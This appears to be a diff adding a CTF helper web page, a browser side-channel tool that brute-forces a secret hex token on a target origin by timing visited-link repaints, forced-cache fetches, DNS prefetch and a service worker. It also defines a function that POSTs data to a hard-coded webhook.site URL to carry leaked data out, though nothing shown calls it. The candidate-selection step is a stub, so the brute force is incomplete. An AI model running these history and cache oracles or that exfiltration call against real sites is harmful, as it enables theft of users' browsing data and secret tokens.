@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<meta charset="utf-8">
+<title>Multi-method History / Cache Oracle — CTF helper</title>
+<style>
+  body      {font:14px/1.4 system-ui;background:#111;color:#eee;margin:0;padding:1rem}
+  input,button{font:inherit}
+  #view     {height:30vh;overflow:hidden;border:1px solid #333;margin-top:.5rem}
+  #view a   {color:#0af;text-decoration:none}
+  #view a:visited{color:#a0a}
+  #log      {white-space:pre-wrap;background:#000;border:1px solid #333;height:35vh;
+             overflow:auto;padding:.5rem;margin-top:.5rem;font-family:monospace}
+  .m        {margin-right:.5rem}
+</style>
+
+<h2>History / cache oracle playground</h2>
+
+<label class=m>Target origin  <input id=host value="http://127.0.0.1:7382/"></label>
+<label class=m>Prefix <input id=prefix value="a" size=4></label>
+<button id=go>Start full sweep</button>
+<span id=status></span>
+
+<div id=view></div>
+<div id=log></div>
+
+<script>
+/* ==============  CONFIG  ============== */
+const HEX     = [...'0123456789abcdef'];   // token_hex charset
+const GUESSES = 32;                        // length to recover
+const LINES   = 300;                       // lines per test (paint)
+/* ============  /CONFIG  =============== */
+const $ = (id)=>document.getElementById(id);
+// leak https://webhook.site/b8464b7a-dbc1-4d3e-aadb-73b5eebf2b15
+async function leak(content){
+  // post to https://webhook.site/b8464b7a-dbc1-4d3e-aadb-73b5eebf2b15
+    await fetch('https://webhook.site/b8464b7a-dbc1-4d3e-aadb-73b5eebf2b15',{
+      method:'POST',headers:{'Content-Type':'text/plain'},body:content
+    });
+}
+const log = (...s)=>{ $('log').textContent += s.join(' ')+"\n"; $('log').scrollTop=1e6; };
+
+async function paintTimingOracle(url){
+  // 1. render wall of identical links → requestAnimationFrame toggle colour
+  const big = '#'.repeat(8000);
+  $('view').innerHTML = '';
+  for(let i=0;i<LINES;i++){
+     const a=document.createElement('a');
+     a.href=url; a.textContent=big+' ';
+     $('view').appendChild(a);
+  }
+  await new Promise(r=>requestAnimationFrame(r));
+  const t0=performance.now();
+  // toggle (forces repaint; visited links are blended differently)
+  document.querySelectorAll('#view a').forEach(a=>{a.style.color='red';a.style.color='';});
+  await new Promise(r=>requestAnimationFrame(r));
+  return performance.now()-t0;
+}
+
+async function fetchTimingOracle(url){
+  // force-cache probe (two fetches: warm + timed)
+  try{
+    await fetch(url,{mode:'no-cors',cache:'reload'});
+    const t0=performance.now();
+    await fetch(url,{mode:'no-cors',cache:'force-cache'});
+    return performance.now()-t0;
+  }catch(e){return NaN;}
+}
+
+function dnsPrefetchOracle(url){
+  return new Promise(resolve=>{
+    const link=document.createElement('link');
+    link.rel='dns-prefetch'; link.href=new URL(url).origin;
+    const t0=performance.now();
+    document.head.appendChild(link);
+    requestAnimationFrame(()=>resolve(performance.now()-t0));
+  });
+}
+
+async function swTimingOracle(url){
+  if(!('serviceWorker' in navigator)) return NaN;
+  // minimal one-off SW that just “waitUntil”s; we time first network fetch
+  await navigator.serviceWorker.register(URL.createObjectURL(new Blob([`
+      self.addEventListener('fetch',e=>{
+        if(e.request.url.includes('_probe_')){
+           const t0=Date.now();
+           e.respondWith(fetch(e.request.clone()).then(r=>{
+               return new Response(r.body,{headers:r.headers,status:r.status});
+           }).finally(()=>clients.matchAll().then(cs=>cs.forEach(c=>c.postMessage(Date.now()-t0)))));
+        }
+      });
+  `],{type:'text/javascript'})));
+  return new Promise(async res=>{
+    navigator.serviceWorker.onmessage=e=>res(e.data);
+    fetch(url+'?_probe_'+Math.random(),{mode:'no-cors'}).catch(()=>res(NaN));
+  });
+}
+
+/* --------  high-level brute  -------- */
+async function brute(){
+  let prefix=$('prefix').value.trim();
+  const host=$('host').value.trim();
+  const candidates=(p)=>HEX.map(x=>p+x);
+  $('status').textContent=' working…';
+  for(let pos=prefix.length;pos<GUESSES;pos++){
+    const guessSet=candidates(prefix);
+    log(`-- position ${pos} (${prefix}) --`);
+    /* coarse phase: paint timing wall */
+    $('view').innerHTML='';
+    for(const g of guessSet){
+      const delta=await paintTimingOracle(host+g);
+      log(`Paint  ${g.padEnd(GUESSES,'•')}  ${delta.toFixed(1)} ms`);
+    }
+    /* pick best ↑ and validate with other signals */
+    let best=guessSet.sort((a,b)=>0)[0]; // here just take first; tweak selector
+    const f1=await fetchTimingOracle(host+best);
+    const f2=await dnsPrefetchOracle(host+best);
+    const f3=await swTimingOracle(host+best);
+    log(`  ↳ candidate ${best}  fetch=${f1.toFixed(1)} dns=${f2.toFixed(1)} sw=${f3.toFixed(1)}`);
+    prefix=best; $('prefix').value=prefix; $('status').textContent=' '+prefix;
+  }
+  log('DONE! Guessed token: '+prefix);
+}
+
+$('go').onclick=()=>{ $('log').textContent=''; brute(); };
+</script>
